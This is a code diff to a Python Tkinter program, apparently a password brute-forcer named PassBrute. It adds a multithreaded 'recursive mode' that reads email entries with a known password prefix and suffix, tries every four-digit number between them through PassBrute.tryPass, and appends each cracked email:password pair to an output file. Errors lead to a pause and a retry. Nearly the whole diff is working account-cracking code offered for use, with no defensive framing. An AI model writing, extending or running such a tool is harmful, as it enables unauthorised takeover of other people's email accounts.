@@ -151,6 +151,9 @@ def setQuit():
 	_quit=False
 
 def recursiveMode():
+	global _done
+	global _trys
+
 	#Funcs
 	def openFile():
 		openFileDialog=filedialog.askopenfilename(initialdir="/", title="Select file to open", filetypes=(("list files","*.list"), ("all files", "*.*")))
@@ -160,8 +163,96 @@ def recursiveMode():
 		saveFileDialog=filedialog.asksaveasfilename(initialdir="/", title="Select file to save", filetypes=(("list files","*.list"), ("all files", "*.*")))
 		varSave.set(saveFileDialog)
 
+	def recursivePassList(name, writeFileName, passEmail, startNum):
+		global _done
+		global _trys
+		mail,passKeys=passEmail.split(":")
+		first,second=passKeys.split(";")
+		num=int(startNum)
+		passToTry=""
+
+		while _trys<10000 and _done==False:
+			try:
+				if num<10:
+					passToTry = first + "000" + str(num) + second
+				elif num<100:
+					passToTry = first + "00" + str(num) + second
+				elif num<1000:
+					passToTry = first + "0" + str(num) + second
+				else:
+					passToTry = first + str(num) + second
+
+				if PassBrute.tryPass(mail, passToTry):
+					_done=True
+					passToWrite=mail+":"+passToTry+"\n"
+					writeFile=open(writeFileName, mode="a")
+					writeFile.write(passToWrite)
+					break
+
+				num+=1
+				_trys+=1
+			except:
+				time.sleep(5)
+
+		if _trys>=10000 and _done==False:
+			_done=True
+			unknownToWrite=mail+":"+"????????"+"\n"
+			writeFile=open(writeFileName, mode="a")
+			writeFile.write(unknownToWrite)
+
+	def fileInterpreter(fileName):
+		fileReader=open(fileName, mode="r")
+		fileContent=fileReader.read()
+
+		memoryChars=""
+		emailList=[]
+		for i in fileContent:
+			if i == "\n":
+				emailList.append(memoryChars)
+				memoryChars=""
+			else:
+				memoryChars+=str(i)
+
+		return emailList
+
 	def startRecursive():
-		pass
+		global _done
+		global _trys
+
+		_done=False
+		_trys=0
+		lblStatus.config(text="Work in progress...", fg="red")
+		rootRecursive.update()
+
+		openFileName=varOpen.get()
+		writeFileName=varSave.get()
+		recursiveThreads=varRecursiveThreads.get()
+		numThread=10000 / int(recursiveThreads)
+		startNum=0
+
+		emailList=fileInterpreter(openFileName)
+
+		for mail in emailList:
+			for i in range(recursiveThreads):
+				threadName = "Thread" + str(i)
+
+				if startNum<10000:
+					threading._start_new_thread(recursivePassList, (threadName, writeFileName, mail, int(startNum)))
+
+				startNum+=numThread
+
+			while _done==False:
+				rootRecursive.update()
+
+			time.sleep(20)
+
+			startNum=0
+			_done=False
+			_trys=0
+		
+		lblStatus.config(text="Completed!", fg="green")
+		_done=True
+		_trys=0
 
     #MainRecursive configuration
 	rootRecursive=Tk()
@@ -177,6 +268,9 @@ def recursiveMode():
 	varOpen=StringVar(rootRecursive)
 	varSave=StringVar(rootRecursive)
 
+	varRecursiveThreads=IntVar(rootRecursive)
+	varRecursiveThreads.set(25)
+
 	#mainRecursiveFrame items
 	Label(mainRecursiveFrame, text="Open File: ").grid(row=0, column=0)
 	txtOpen=Entry(mainRecursiveFrame)
@@ -190,10 +284,16 @@ def recursiveMode():
 	txtSave.grid(row=1, column=1)
 	Button(mainRecursiveFrame, text="Save", command=saveFile).grid(row=1, column=2)
 
-	Button(mainRecursiveFrame, text="START", command=startRecursive).grid(row=2, column=0)
+	Label(mainRecursiveFrame, text="Threads: ").grid(row=2, column=0)
+	txtRecursiveThreads=Entry(mainRecursiveFrame)
+	txtRecursiveThreads.config(fg="blue", justify="center", textvariable=varRecursiveThreads)
+	txtRecursiveThreads.grid(row=2, column=1, columnspan=2)
+
+	Button(mainRecursiveFrame, text="START", command=startRecursive).grid(row=3, column=0)
 
 	lblStatus=Label(mainRecursiveFrame)
-	lblStatus.grid(row=2, column=1, columnspan=2)
+	lblStatus.config(fg="red")
+	lblStatus.grid(row=3, column=1, columnspan=2)
 
 	rootRecursive.mainloop()
 
@@ -213,7 +313,7 @@ varFirstKey=StringVar(root)
 varLastKey=StringVar(root)
 
 varThreads=IntVar(root)
-varThreads.set(10)
+varThreads.set(25)
 
 #Menu bar configuration
 MenuBar=Menu(root)
